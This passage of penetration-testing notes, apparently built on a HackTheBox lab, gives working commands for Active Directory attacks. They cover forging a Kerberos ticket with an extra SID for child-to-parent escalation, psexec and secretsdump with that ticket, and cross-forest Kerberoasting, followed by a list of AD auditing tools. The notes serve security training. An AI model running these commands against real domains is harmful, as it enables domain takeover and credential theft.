lookupsid.py logistics.inlanefreight.local/htb-student_adm@172.16.5.5 | grep -B12 "Enterprise Admins"
# Enterprise Admins RID = 519

# Step 4: Forge ticket
ticketer.py -nthash 9d765b482771505cbe97411065964d5f -domain LOGISTICS.INLANEFREIGHT.LOCAL -domain-sid S-1-5-21-2806153819-209893948-922872689 -extra-sid S-1-5-21-3842939050-3880317879-2865463114-519 hacker

# Step 5: Use ticket
export KRB5CCNAME=hacker.ccache
psexec.py LOGISTICS.INLANEFREIGHT.LOCAL/hacker@academy-ea-dc01.inlanefreight.local -k -no-pass -target-ip 172.16.5.5
secretsdump.py -just-dc-user INLANEFREIGHT/administrator -k -no-pass ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL

# Automated
raiseChild.py -target-exec 172.16.5.5 LOGISTICS.INLANEFREIGHT.LOCAL/htb-student_adm
```

### Cross-Forest Trust Abuse

```bash
# Cross-forest Kerberoasting
GetUserSPNs.py -target-domain FREIGHTLOGISTICS.LOCAL INLANEFREIGHT.LOCAL/wley
GetUserSPNs.py -request -target-domain FREIGHTLOGISTICS.LOCAL INLANEFREIGHT.LOCAL/wley

# Foreign group membership (users from one domain in groups of another)
Get-DomainForeignGroupMember -Domain FREIGHTLOGISTICS.LOCAL
Convert-SidToName S-1-5-21-3842939050-3880317879-2865463114-500
# If INLANEFREIGHT\administrator is in FREIGHTLOGISTICS Administrators group:
Enter-PSSession -ComputerName ACADEMY-EA-DC03.FREIGHTLOGISTICS.LOCAL -Credential INLANEFREIGHT\administrator
```

---

## AD Auditing Tools

```bash
# PingCastle — risk scoring + reports
PingCastle.exe → 1 (healthcheck) → enter DC FQDN
# Generates HTML report with risk score, anomalies, stale objects

# ADRecon — comprehensive data collection
.\ADRecon.ps1
# Outputs CSV folder + GPO HTML report
# Generate Excel from different host: .\ADRecon.ps1 -GenExcel <report_folder>

# Group3r — GPO vulnerability finder
group3r.exe -f findings.log

# adidnsdump — enumerate all DNS records
adidnsdump -u domain\\user ldap://<DC_IP> -r

# AD Explorer (Sysinternals) — snapshot AD for offline analysis
# File → Create Snapshot → save .dat file
# Load snapshot → browse offline
```

> [!tip] Tool selection summary: **BloodHound** = attack path visualization + ACL chains. **PingCastle** = quick risk score for client report. **Snaffler** = credential hunting in shares. **Group3r** = GPO misconfigs. **ADRecon** = comprehensive data export. **adidnsdump** = hidden DNS records.

> [!warning] Always document every change made during an assessment: passwords changed, groups modified, fake SPNs added, tickets forged. Clean up in reverse order. Include all changes in final report.